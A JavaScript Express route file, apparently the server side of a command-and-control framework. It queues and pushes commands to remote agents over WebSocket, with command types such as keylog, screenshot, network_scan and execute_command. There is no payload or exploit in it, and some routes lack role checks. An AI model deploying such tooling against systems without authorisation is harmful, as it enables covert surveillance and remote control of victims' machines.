const express = require('express');
const Joi = require('joi');
const Command = require('../models/Command');
const Agent = require('../models/Agent');
const Beacon = require('../models/Beacon');
const { requireRole } = require('../middleware/auth');

const router = express.Router();

// Validation schemas
const commandSchema = Joi.object({
  agentId: Joi.string().required(),
  type: Joi.string().valid('system_info', 'file_transfer', 'screenshot', 'keylog', 'network_scan', 'process_list', 'execute_command', 'download_file', 'upload_file', 'custom').required(),
  command: Joi.string().max(10000).required(),
  parameters: Joi.object().default({}),
  priority: Joi.string().valid('low', 'normal', 'high', 'critical').default('normal'),
  timeout: Joi.number().min(1000).max(3600000).default(300000),
  scheduledAt: Joi.date().min('now').optional(),
  tags: Joi.array().items(Joi.string()).default([])
});

// Get all commands
router.get('/', async (req, res) => {
  try {
    const { 
      status, 
      agentId, 
      type, 
      priority, 
      page = 1, 
      limit = 10, 
      search,
      startDate,
      endDate
    } = req.query;
    
    const query = {};
    if (status) query.status = status;
    if (agentId) query.agentId = agentId;
    if (type) query.type = type;
    if (priority) query.priority = priority;
    if (search) {
      query.$or = [
        { command: { $regex: search, $options: 'i' } },
        { commandId: { $regex: search, $options: 'i' } }
      ];
    }
    if (startDate || endDate) {
      query.createdAt = {};
      if (startDate) query.createdAt.$gte = new Date(startDate);
      if (endDate) query.createdAt.$lte = new Date(endDate);
    }

    const commands = await Command.find(query)
      .populate('agentId', 'name agentId status')
      .populate('beaconId', 'name beaconId')
      .populate('createdBy', 'username')
      .sort({ createdAt: -1 })
      .limit(limit * 1)
      .skip((page - 1) * limit);

    const total = await Command.countDocuments(query);

    res.json({
      commands,
      pagination: {
        current: parseInt(page),
        pages: Math.ceil(total / limit),
        total
      }
    });
  } catch (error) {
    console.error('Get commands error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get single command
router.get('/:id', async (req, res) => {
  try {
    const command = await Command.findById(req.params.id)
      .populate('agentId', 'name agentId status systemInfo')
      .populate('beaconId', 'name beaconId location')
      .populate('createdBy', 'username email');
    
    if (!command) {
      return res.status(404).json({ error: 'Command not found' });
    }

    res.json({ command });
  } catch (error) {
    console.error('Get command error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Create new command
router.post('/', requireRole(['admin', 'operator']), async (req, res) => {
  try {
    const { error, value } = commandSchema.validate(req.body);
    if (error) {
      return res.status(400).json({ error: error.details[0].message });
    }

    // Verify agent exists and is active
    const agent = await Agent.findById(value.agentId).populate('beaconId');
    if (!agent) {
      return res.status(400).json({ error: 'Agent not found' });
    }

    if (!agent.isActive) {
      return res.status(400).json({ error: 'Agent is not active' });
    }

    if (agent.status === 'offline') {
      return res.status(400).json({ error: 'Agent is offline' });
    }

    // Check if agent supports the command type
    if (!agent.capabilities.includes(value.type) && value.type !== 'custom') {
      return res.status(400).json({ error: 'Agent does not support this command type' });
    }

    const command = new Command({
      ...value,
      beaconId: agent.beaconId._id,
      createdBy: req.user._id
    });

    await command.save();

    // Emit command to agent via WebSocket
    const io = req.app.get('io');
    io.to(`agent_${agent.agentId}`).emit('new-command', {
      commandId: command.commandId,
      type: command.type,
      command: command.command,
      parameters: command.parameters,
      timeout: command.timeout
    });

    res.status(201).json({
      message: 'Command created and sent to agent',
      command
    });
  } catch (error) {
    console.error('Create command error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Update command status
router.patch('/:id/status', requireRole(['admin', 'operator']), async (req, res) => {
  try {
    const { status } = req.body;
    
    if (!['pending', 'executing', 'completed', 'failed', 'cancelled', 'timeout'].includes(status)) {
      return res.status(400).json({ error: 'Invalid status' });
    }

    const command = await Command.findByIdAndUpdate(
      req.params.id,
      { 
        status,
        ...(status === 'executing' && { executedAt: new Date() }),
        ...(status === 'completed' && { completedAt: new Date() })
      },
      { new: true }
    ).populate('agentId', 'name agentId status');

    if (!command) {
      return res.status(404).json({ error: 'Command not found' });
    }

    res.json({
      message: 'Command status updated successfully',
      command
    });
  } catch (error) {
    console.error('Update command status error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Cancel command
router.patch('/:id/cancel', requireRole(['admin', 'operator']), async (req, res) => {
  try {
    const command = await Command.findById(req.params.id);
    
    if (!command) {
      return res.status(404).json({ error: 'Command not found' });
    }

    if (!['pending', 'executing'].includes(command.status)) {
      return res.status(400).json({ error: 'Command cannot be cancelled' });
    }

    command.status = 'cancelled';
    command.completedAt = new Date();
    await command.save();

    // Notify agent to cancel command
    const agent = await Agent.findById(command.agentId);
    const io = req.app.get('io');
    io.to(`agent_${agent.agentId}`).emit('cancel-command', {
      commandId: command.commandId
    });

    res.json({
      message: 'Command cancelled successfully',
      command
    });
  } catch (error) {
    console.error('Cancel command error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Retry command
router.post('/:id/retry', requireRole(['admin', 'operator']), async (req, res) => {
  try {
    const originalCommand = await Command.findById(req.params.id);
    
    if (!originalCommand) {
      return res.status(404).json({ error: 'Command not found' });
    }

    if (originalCommand.retryCount >= 3) {
      return res.status(400).json({ error: 'Maximum retry count reached' });
    }

    // Create new command based on original
    const newCommand = new Command({
      agentId: originalCommand.agentId,
      beaconId: originalCommand.beaconId,
      type: originalCommand.type,
      command: originalCommand.command,
      parameters: originalCommand.parameters,
      priority: originalCommand.priority,
      timeout: originalCommand.timeout,
      createdBy: req.user._id,
      retryCount: originalCommand.retryCount + 1
    });

    await newCommand.save();

    // Update original command retry count
    originalCommand.retryCount += 1;
    await originalCommand.save();

    // Send to agent
    const agent = await Agent.findById(newCommand.agentId);
    const io = req.app.get('io');
    io.to(`agent_${agent.agentId}`).emit('new-command', {
      commandId: newCommand.commandId,
      type: newCommand.type,
      command: newCommand.command,
      parameters: newCommand.parameters,
      timeout: newCommand.timeout
    });

    res.status(201).json({
      message: 'Command retried successfully',
      command: newCommand
    });
  } catch (error) {
    console.error('Retry command error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Delete command
router.delete('/:id', requireRole(['admin']), async (req, res) => {
  try {
    const command = await Command.findByIdAndDelete(req.params.id);
    
    if (!command) {
      return res.status(404).json({ error: 'Command not found' });
    }

    res.json({ message: 'Command deleted successfully' });
  } catch (error) {
    console.error('Delete command error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get command statistics
router.get('/stats/overview', async (req, res) => {
  try {
    const { startDate, endDate } = req.query;
    
    const query = {};
    if (startDate || endDate) {
      query.createdAt = {};
      if (startDate) query.createdAt.$gte = new Date(startDate);
      if (endDate) query.createdAt.$lte = new Date(endDate);
    }

    const totalCommands = await Command.countDocuments(query);
    const completedCommands = await Command.countDocuments({ ...query, status: 'completed' });
    const failedCommands = await Command.countDocuments({ ...query, status: 'failed' });
    const pendingCommands = await Command.countDocuments({ ...query, status: 'pending' });
    const executingCommands = await Command.countDocuments({ ...query, status: 'executing' });

    // Commands by type
    const commandsByType = await Command.aggregate([
      { $match: query },
      { $group: { _id: '$type', count: { $sum: 1 } } },
      { $sort: { count: -1 } }
    ]);

    // Commands by priority
    const commandsByPriority = await Command.aggregate([
      { $match: query },
      { $group: { _id: '$priority', count: { $sum: 1 } } },
      { $sort: { count: -1 } }
    ]);

    res.json({
      total: totalCommands,
      completed: completedCommands,
      failed: failedCommands,
      pending: pendingCommands,
      executing: executingCommands,
      successRate: totalCommands > 0 ? (completedCommands / totalCommands * 100).toFixed(2) : 0,
      byType: commandsByType,
      byPriority: commandsByPriority
    });
  } catch (error) {
    console.error('Get command stats error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

module.exports = router;